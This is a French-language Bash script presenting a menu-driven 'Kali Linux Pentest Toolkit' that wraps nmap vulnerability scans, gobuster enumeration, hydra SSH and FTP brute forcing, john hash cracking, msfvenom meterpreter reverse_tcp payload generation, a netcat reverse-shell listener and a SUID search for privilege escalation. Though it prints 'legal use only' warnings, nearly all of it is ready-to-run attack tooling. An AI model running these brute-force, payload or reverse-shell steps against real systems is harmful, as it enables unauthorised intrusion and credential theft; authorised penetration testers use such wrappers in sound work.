# --- Couleurs ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# --- Vérification root ---
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${YELLOW}[!] Certaines fonctions nécessitent les droits root.${RESET}"
        echo -e "${DIM}    Relancer avec sudo pour un accès complet.${RESET}"
        sleep 1
    fi
}

# --- Bannière ---
banner() {
    clear
    echo -e "${RED}"
    echo "  ██╗  ██╗ █████╗ ██╗     ██╗    ████████╗██╗  ██╗"
    echo "  ██║ ██╔╝██╔══██╗██║     ██║    ╚══██╔══╝╚██╗██╔╝"
    echo "  █████╔╝ ███████║██║     ██║       ██║    ╚███╔╝ "
    echo "  ██╔═██╗ ██╔══██║██║     ██║       ██║    ██╔██╗ "
    echo "  ██║  ██╗██║  ██║███████╗██║       ██║   ██╔╝ ██╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝       ╚═╝   ╚═╝  ╚═╝"
    echo -e "${RESET}"
    echo -e "${DIM}  ─────────────────────────────────────────────────────${RESET}"
    echo -e "${WHITE}   Kali Linux Pentest Toolkit  ${DIM}v1.0  |  $(date '+%d/%m/%Y %H:%M')${RESET}"
    echo -e "${DIM}  ─────────────────────────────────────────────────────${RESET}"
    echo ""
}

# --- Séparateur ---
sep() {
    echo -e "${DIM}  ─────────────────────────────────────────────────────${RESET}"
}

# --- Info / OK / Erreur ---
info()  { echo -e "  ${CYAN}[*]${RESET} $1"; }
ok()    { echo -e "  ${GREEN}[✓]${RESET} $1"; }
warn()  { echo -e "  ${YELLOW}[!]${RESET} $1"; }
err()   { echo -e "  ${RED}[✗]${RESET} $1"; }
title() { echo -e "\n  ${BOLD}${MAGENTA}━━ $1 ━━${RESET}\n"; }

# --- Pause ---
pause() {
    echo ""
    echo -e "  ${DIM}Appuyez sur [Entrée] pour continuer...${RESET}"
    read -r
}

# ============================================================
#  MODULE 1 — SCAN RÉSEAU
# ============================================================
module_scan_reseau() {
    banner
    title "SCAN RÉSEAU"

    echo -e "  ${WHITE}1.${RESET} Découverte d'hôtes (ping sweep)"
    echo -e "  ${WHITE}2.${RESET} Scan de ports rapide (nmap)"
    echo -e "  ${WHITE}3.${RESET} Scan de ports + services + OS"
    echo -e "  ${WHITE}4.${RESET} Scan vulnérabilités (nmap --script vuln)"
    echo -e "  ${WHITE}0.${RESET} Retour"
    echo ""
    sep
    echo -ne "  ${CYAN}Choix :${RESET} "
    read -r choix

    case $choix in
        1)
            echo -ne "\n  ${CYAN}Réseau cible (ex: 192.168.1.0/24) :${RESET} "
            read -r reseau
            info "Ping sweep sur $reseau..."
            sep
            nmap -sn "$reseau" 2>/dev/null || err "nmap introuvable. Installez-le : apt install nmap"
            ;;
        2)
            echo -ne "\n  ${CYAN}Cible (IP ou domaine) :${RESET} "
            read -r cible
            info "Scan rapide des ports sur $cible..."
            sep
            nmap -T4 -F "$cible" 2>/dev/null || err "nmap introuvable."
            ;;
        3)
            echo -ne "\n  ${CYAN}Cible (IP ou domaine) :${RESET} "
            read -r cible
            info "Scan complet (ports + services + OS) sur $cible..."
            warn "Cette opération peut être longue..."
            sep
            nmap -A -T4 "$cible" 2>/dev/null || err "nmap introuvable."
            ;;
        4)
            echo -ne "\n  ${CYAN}Cible (IP ou domaine) :${RESET} "
            read -r cible
            warn "Scan de vulnérabilités — usage légal uniquement !"
            sep
            nmap -sV --script vuln "$cible" 2>/dev/null || err "nmap introuvable."
            ;;
        0) return ;;
        *) warn "Option invalide." ;;
    esac
    pause
}

# ============================================================
#  MODULE 2 — ANALYSE WEB
# ============================================================
module_web() {
    banner
    title "ANALYSE WEB"

    echo -e "  ${WHITE}1.${RESET} Informations HTTP (headers)"
    echo -e "  ${WHITE}2.${RESET} Énumération de répertoires (gobuster)"
    echo -e "  ${WHITE}3.${RESET} Vérification SSL/TLS (sslscan)"
    echo -e "  ${WHITE}4.${RESET} Recherche de sous-domaines (gobuster DNS)"
    echo -e "  ${WHITE}0.${RESET} Retour"
    echo ""
    sep
    echo -ne "  ${CYAN}Choix :${RESET} "
    read -r choix

    case $choix in
        1)
            echo -ne "\n  ${CYAN}URL cible (ex: https://example.com) :${RESET} "
            read -r url
            info "Récupération des headers HTTP de $url..."
            sep
            curl -sI "$url" 2>/dev/null || err "curl introuvable. : apt install curl"
            ;;
        2)
            echo -ne "\n  ${CYAN}URL cible :${RESET} "
            read -r url
            echo -ne "  ${CYAN}Wordlist (Entrée = /usr/share/wordlists/dirb/common.txt) :${RESET} "
            read -r wl
            wl="${wl:-/usr/share/wordlists/dirb/common.txt}"
            info "Énumération sur $url avec $wl..."
            sep
            gobuster dir -u "$url" -w "$wl" -t 30 2>/dev/null || err "gobuster introuvable : apt install gobuster"
            ;;
        3)
            echo -ne "\n  ${CYAN}Hôte cible :${RESET} "
            read -r host
            info "Analyse SSL/TLS de $host..."
            sep
            sslscan "$host" 2>/dev/null || err "sslscan introuvable : apt install sslscan"
            ;;
        4)
            echo -ne "\n  ${CYAN}Domaine cible (ex: example.com) :${RESET} "
            read -r domaine
            echo -ne "  ${CYAN}Wordlist (Entrée = /usr/share/wordlists/dirb/common.txt) :${RESET} "
            read -r wl
            wl="${wl:-/usr/share/wordlists/dirb/common.txt}"
            info "Recherche de sous-domaines pour $domaine..."
            sep
            gobuster dns -d "$domaine" -w "$wl" 2>/dev/null || err "gobuster introuvable."
            ;;
        0) return ;;
        *) warn "Option invalide." ;;
    esac
    pause
}

# ============================================================
#  MODULE 3 — MOTS DE PASSE
# ============================================================
module_passwords() {
    banner
    title "ATTAQUES MOTS DE PASSE"

    echo -e "  ${WHITE}1.${RESET} Bruteforce SSH (hydra)"
    echo -e "  ${WHITE}2.${RESET} Bruteforce FTP (hydra)"
    echo -e "  ${WHITE}3.${RESET} Crack hash (john the ripper)"
    echo -e "  ${WHITE}4.${RESET} Générer un hash MD5 / SHA256"
    echo -e "  ${WHITE}0.${RESET} Retour"
    echo ""
    sep
    echo -ne "  ${CYAN}Choix :${RESET} "
    read -r choix

    case $choix in
        1)
            echo -ne "\n  ${CYAN}IP cible :${RESET} "; read -r ip
            echo -ne "  ${CYAN}Utilisateur :${RESET} "; read -r user
            echo -ne "  ${CYAN}Wordlist :${RESET} "; read -r wl
            warn "Usage légal uniquement !"
            sep
            hydra -l "$user" -P "$wl" "$ip" ssh 2>/dev/null || err "hydra introuvable : apt install hydra"
            ;;
        2)
            echo -ne "\n  ${CYAN}IP cible :${RESET} "; read -r ip
            echo -ne "  ${CYAN}Utilisateur :${RESET} "; read -r user
            echo -ne "  ${CYAN}Wordlist :${RESET} "; read -r wl
            warn "Usage légal uniquement !"
            sep
            hydra -l "$user" -P "$wl" "$ip" ftp 2>/dev/null || err "hydra introuvable."
            ;;
        3)
            echo -ne "\n  ${CYAN}Fichier de hash :${RESET} "; read -r hashfile
            echo -ne "  ${CYAN}Wordlist (Entrée = /usr/share/wordlists/rockyou.txt) :${RESET} "; read -r wl
            wl="${wl:-/usr/share/wordlists/rockyou.txt}"
            info "Tentative de crack avec john..."
            sep
            john "$hashfile" --wordlist="$wl" 2>/dev/null || err "john introuvable : apt install john"
            ;;
        4)
            echo -ne "\n  ${CYAN}Texte à hasher :${RESET} "; read -r texte
            echo -e "\n  ${GREEN}MD5    :${RESET} $(echo -n "$texte" | md5sum | cut -d' ' -f1)"
            echo -e "  ${GREEN}SHA256 :${RESET} $(echo -n "$texte" | sha256sum | cut -d' ' -f1)"
            ;;
        0) return ;;
        *) warn "Option invalide." ;;
    esac
    pause
}

# ============================================================
#  MODULE 4 — INFORMATIONS SYSTÈME & RÉSEAU
# ============================================================
module_sysinfo() {
    banner
    title "INFORMATIONS SYSTÈME"

    echo -e "  ${WHITE}1.${RESET} Interfaces réseau actives"
    echo -e "  ${WHITE}2.${RESET} Connexions actives (netstat)"
    echo -e "  ${WHITE}3.${RESET} Processus en écoute"
    echo -e "  ${WHITE}4.${RESET} Infos système complet"
    echo -e "  ${WHITE}5.${RESET} Traceroute vers une cible"
    echo -e "  ${WHITE}6.${RESET} WHOIS d'un domaine / IP"
    echo -e "  ${WHITE}0.${RESET} Retour"
    echo ""
    sep
    echo -ne "  ${CYAN}Choix :${RESET} "
    read -r choix

    case $choix in
        1)
            sep
            ip addr show 2>/dev/null || ifconfig
            ;;
        2)
            sep
            ss -tuln 2>/dev/null || netstat -tuln
            ;;
        3)
            sep
            ss -tlnp 2>/dev/null
            ;;
        4)
            sep
            echo -e "  ${CYAN}OS        :${RESET} $(uname -a)"
            echo -e "  ${CYAN}Hostname  :${RESET} $(hostname)"
            echo -e "  ${CYAN}Utilisateur:${RESET} $(whoami)"
            echo -e "  ${CYAN}IP locale :${RESET} $(hostname -I | awk '{print $1}')"
            echo -e "  ${CYAN}Uptime    :${RESET} $(uptime -p 2>/dev/null || uptime)"
            echo -e "  ${CYAN}CPU       :${RESET} $(lscpu | grep 'Model name' | sed 's/.*: *//')"
            echo -e "  ${CYAN}RAM       :${RESET} $(free -h | grep Mem | awk '{print $2" total, "$3" utilisé"}')"
            ;;
        5)
            echo -ne "\n  ${CYAN}Cible :${RESET} "; read -r cible
            sep
            traceroute "$cible" 2>/dev/null || err "traceroute introuvable : apt install traceroute"
            ;;
        6)
            echo -ne "\n  ${CYAN}Domaine ou IP :${RESET} "; read -r cible
            sep
            whois "$cible" 2>/dev/null | head -40 || err "whois introuvable : apt install whois"
            ;;
        0) return ;;
        *) warn "Option invalide." ;;
    esac
    pause
}

# ============================================================
#  MODULE 5 — OUTILS DIVERS
# ============================================================
module_divers() {
    banner
    title "OUTILS DIVERS"

    echo -e "  ${WHITE}1.${RESET} Générer un payload Metasploit (msfvenom)"
    echo -e "  ${WHITE}2.${RESET} Écoute reverse shell (netcat)"
    echo -e "  ${WHITE}3.${RESET} Encoder en Base64 / Décoder"
    echo -e "  ${WHITE}4.${RESET} Recherche de fichiers SUID (escalade privs)"
    echo -e "  ${WHITE}5.${RESET} Vérifier les outils installés"
    echo -e "  ${WHITE}0.${RESET} Retour"
    echo ""
    sep
    echo -ne "  ${CYAN}Choix :${RESET} "
    read -r choix

    case $choix in
        1)
            echo -ne "\n  ${CYAN}IP locale (LHOST) :${RESET} "; read -r lhost
            echo -ne "  ${CYAN}Port local (LPORT) :${RESET} "; read -r lport
            echo -e "\n  ${CYAN}Plateformes :${RESET} linux/x86 | linux/x64 | windows/x86 | windows/x64"
            echo -ne "  ${CYAN}Plateforme/Arch :${RESET} "; read -r platform
            echo -ne "  ${CYAN}Nom du fichier de sortie :${RESET} "; read -r outfile
            sep
            msfvenom -p "$platform/meterpreter/reverse_tcp" LHOST="$lhost" LPORT="$lport" -f elf -o "$outfile" 2>/dev/null \
                || err "msfvenom introuvable. Installez Metasploit."
            ok "Payload généré : $outfile"
            ;;
        2)
            echo -ne "\n  ${CYAN}Port d'écoute :${RESET} "; read -r port
            info "Démarrage de netcat sur le port $port..."
            warn "Ctrl+C pour arrêter."
            sep
            nc -lvnp "$port" 2>/dev/null || err "netcat introuvable : apt install netcat-traditional"
            ;;
        3)
            echo -e "\n  ${WHITE}1.${RESET} Encoder  ${WHITE}2.${RESET} Décoder"
            echo -ne "  ${CYAN}Choix :${RESET} "; read -r b64choix
            echo -ne "  ${CYAN}Texte :${RESET} "; read -r texte
            if [[ $b64choix == "1" ]]; then
                echo -e "\n  ${GREEN}Base64 :${RESET} $(echo -n "$texte" | base64)"
            else
                echo -e "\n  ${GREEN}Décodé :${RESET} $(echo "$texte" | base64 -d 2>/dev/null)"
            fi
            ;;
        4)
            info "Recherche de binaires SUID (peut nécessiter root)..."
            sep
            find / -perm -4000 -type f 2>/dev/null | while read -r f; do
                echo -e "  ${YELLOW}SUID${RESET}  $f"
            done
            ;;
        5)
            sep
            tools=(nmap gobuster hydra john nikto sqlmap metasploit-framework netcat curl whois traceroute sslscan)
            for t in "${tools[@]}"; do
                if command -v "$t" &>/dev/null; then
                    ok "$t"
                else
                    err "$t  ${DIM}(non installé)${RESET}"
                fi
            done
            ;;
        0) return ;;
        *) warn "Option invalide." ;;
    esac
    pause
}

# ============================================================
#  MENU PRINCIPAL
# ============================================================
menu_principal() {
    while true; do
        banner
        echo -e "  ${BOLD}${WHITE}MENU PRINCIPAL${RESET}"
        echo ""
        echo -e "  ${RED}[1]${RESET}  🔍  Scan Réseau"
        echo -e "  ${RED}[2]${RESET}  🌐  Analyse Web"
        echo -e "  ${RED}[3]${RESET}  🔑  Mots de Passe"
        echo -e "  ${RED}[4]${RESET}  💻  Infos Système & Réseau"
        echo -e "  ${RED}[5]${RESET}  🛠️   Outils Divers"
        echo ""
        sep
        echo -e "  ${DIM}[0]  Quitter${RESET}"
        echo ""
        echo -ne "  ${CYAN}${BOLD}Votre choix :${RESET} "
        read -r choix

        case $choix in
            1) module_scan_reseau ;;
            2) module_web ;;
            3) module_passwords ;;
            4) module_sysinfo ;;
            5) module_divers ;;
            0)
                banner
                echo -e "  ${GREEN}Au revoir. Utilisez ces outils de manière éthique et légale.${RESET}"
                echo ""
                exit 0
                ;;
            *)
                warn "Option invalide."
                sleep 1
                ;;
        esac
    done
}

# ============================================================
#  POINT D'ENTRÉE
# ============================================================
check_root
menu_principal